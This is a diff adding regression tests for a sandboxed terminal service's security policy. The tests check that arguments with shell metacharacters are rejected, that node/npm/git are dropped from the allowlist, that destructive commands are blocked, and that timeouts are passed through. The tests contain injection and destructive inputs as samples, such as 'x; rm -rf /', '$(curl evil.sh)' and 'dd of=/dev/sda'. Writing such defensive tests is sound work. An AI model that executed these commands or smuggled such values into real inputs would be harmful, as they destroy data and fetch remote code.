@@ -180,7 +180,7 @@ describe("托管沙箱适配器（DI 假 SDK）", () => {
     const result = await provider.execute({ command: "echo", args: ["hello"], workdir: "/w" });
 
     expect(result).toMatchObject({ exitCode: 0, stdout: "hello" });
-    expect(run).toHaveBeenCalledWith("echo hello", { cwd: "/w" });
+    expect(run).toHaveBeenCalledWith("echo hello", { cwd: "/w", timeoutMs: undefined });
     expect(kill).toHaveBeenCalled();
   });
 
@@ -205,5 +205,81 @@ describe("托管沙箱适配器（DI 假 SDK）", () => {
 
     const result = await service.execute("s2", { command: "echo", args: ["x"] });
     expect(result.stdout).toBe("e2b-ok");
+  });
+});
+
+describe("审计修复回归（H1 元字符闸门 / M5 超时透传）", () => {
+  it("参数含 shell 元字符一律拒绝（; | & $ ` < > ( ) 换行）", () => {
+    const { service } = makeService({ allowedCommands: "*" });
+    const cases = [
+      ["echo", ["x; rm -rf /"]],
+      ["echo", ["a && node -e 'evil'"]],
+      ["echo", ["a | sh"]],
+      ["echo", ["$(curl evil.sh)"]],
+      ["echo", ["`curl evil.sh`"]],
+      ["echo", ["a > /etc/passwd"]],
+      ["echo", ["a\nrm -rf /"]],
+      ["echo", ["(cd / && ls)"]],
+    ] as const;
+    for (const [command, args] of cases) {
+      expect(
+        service.execute("audit-s", { command, args: [...args] }),
+      ).rejects.toMatchObject({ exitCode: 126 });
+    }
+  });
+
+  it("合法含空格参数不受影响", async () => {
+    const { service } = makeService({ allowedCommands: "*" });
+    const result = await service.execute("audit-s", {
+      command: "echo",
+      args: ["hello world", "with spaces"],
+    });
+    expect(result.exitCode).toBe(0);
+  });
+
+  it("工厂默认白名单不再包含 node/npm/pnpm/git（审计 H1 收紧）", async () => {
+    const { createTerminalService } = await import("../createTerminalService");
+    const { service } = await createTerminalService({ provider: "dry-run" });
+    for (const cmd of ["node", "npm", "pnpm", "git"]) {
+      await expect(
+        service.execute("audit-s", { command: cmd, args: ["-v"] }),
+      ).rejects.toMatchObject({ exitCode: 126 });
+    }
+  });
+
+  it("黑名单增强：rm -fr / chmod 0777 / dd of=/dev/ / find -delete", async () => {
+    // 断言对象为工厂默认策略（SANDBOX_POLICY_DEFAULTS）而非测试本地 makePolicy
+    const { SANDBOX_POLICY_DEFAULTS } = await import("../createTerminalService");
+    const policy = new SandboxPolicy({
+      allowedCommands: "*",
+      blockedPatterns: SANDBOX_POLICY_DEFAULTS.blockedPatterns,
+      session: { maxCommands: 5, windowMs: 60_000 },
+    });
+    expect(policy.check("rm", "rm -fr /").verdict).toBe("denied");
+    expect(policy.check("chmod", "chmod 0777 /tmp").verdict).toBe("denied");
+    expect(policy.check("dd", "dd if=x of=/dev/sda").verdict).toBe("denied");
+    expect(policy.check("find", "find / -name x -delete").verdict).toBe("denied");
+  });
+
+  it("解析后的超时注入供应商请求（原生 timeout 透传）", async () => {
+    const run = vi.fn().mockResolvedValue({ exitCode: 0, stdout: "", stderr: "" });
+    const create = vi.fn().mockResolvedValue({
+      commands: { run },
+      kill: vi.fn().mockResolvedValue(undefined),
+    });
+    const policy = new SandboxPolicy({
+      allowedCommands: ["echo"],
+      session: { maxCommands: 5, windowMs: 60_000 },
+      defaultTimeoutMs: 7_500,
+      maxTimeoutMs: 10_000,
+    });
+    const service = new TerminalService({ policy, defaultProvider: "e2b" });
+    const { E2BProvider } = await import("../providers/E2BProvider");
+    service.registerProvider(new E2BProvider({ sdk: { Sandbox: { create } } }));
+    service.registerProvider(new DryRunProvider());
+
+    await service.execute("s", { command: "echo", args: ["x"] });
+    // run 收到解析后的 7.5s（而非请求缺省），create 亦带 apiKey 透传位
+    expect(run).toHaveBeenCalledWith("echo x", { cwd: undefined, timeoutMs: 7_500 });
   });
 });
